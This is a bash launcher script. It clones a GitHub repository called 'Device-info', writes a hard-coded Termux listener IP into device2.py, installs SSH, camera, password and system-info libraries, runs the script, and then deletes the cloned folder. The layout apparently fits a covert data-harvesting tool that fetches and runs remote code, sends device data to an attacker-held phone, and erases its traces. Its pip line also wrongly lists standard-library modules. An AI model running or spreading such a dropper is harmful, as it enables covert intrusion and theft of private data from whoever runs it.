#!/bin/bash

# Set the folder name for the cloned repository
CLONE_DIR="Device-info"

# Check if Python is installed
if ! command -v python3 &> /dev/null; then
    echo "Python not found. Installing Python..."
    # Install Python (using apt for Ubuntu/Debian systems)
    sudo apt update
    sudo apt install -y python3 python3-pip
fi

# Check if Git is installed
if ! command -v git &> /dev/null; then
    echo "Git not found. Installing Git..."
    sudo apt install -y git
fi

# Clone the GitHub repository if it doesn't already exist
# Replace the URL with your actual GitHub repository URL
if [ ! -d "$CLONE_DIR" ]; then
    git clone https://github.com/uchihasosuke/Device-info.git "$CLONE_DIR"
fi

# Change directory to the cloned repository
cd "$CLONE_DIR"

# Set the Termux IP address (replace with your Termux IP)
TERMUX_IP="192.168.39.25"

# Replace the placeholder IP in device2.py with the Termux IP
sed -i "s/TERMUX_IP = \"192.168.x.x\"/TERMUX_IP = \"$TERMUX_IP\"/" device2.py

# Install required Python packages
python3 -m pip install platform socket uuid opencv-python datetime paramiko re psutil getpass

# Run the Python script
python3 device2.py

# Go back to the parent directory
cd ..

# Delete the cloned repository folder
rm -rf "$CLONE_DIR"

# Exit the script
exit 0
